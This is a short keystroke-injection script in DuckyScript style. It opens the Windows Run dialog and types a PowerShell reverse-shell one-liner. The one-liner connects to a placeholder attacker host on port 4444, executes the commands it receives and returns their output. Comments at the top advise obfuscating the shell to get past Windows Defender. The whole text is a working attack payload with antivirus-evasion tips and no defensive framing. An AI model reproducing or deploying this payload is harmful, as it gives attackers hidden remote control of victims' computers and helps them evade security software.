REM The Windows Defender will likely identify this as a malicious action and block it. To avoid this,
REM you can generate a disguised shell at www.revshells.com or https://github.com/danielbohannon/Invoke-Obfuscation.

DELAY 500
GUI r
DELAY 500
STRING $sm=(New-Object Net.Sockets.TCPClient("HOST_IP_ADDRESS",4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
DELAY 500
ENTER
DELAY 500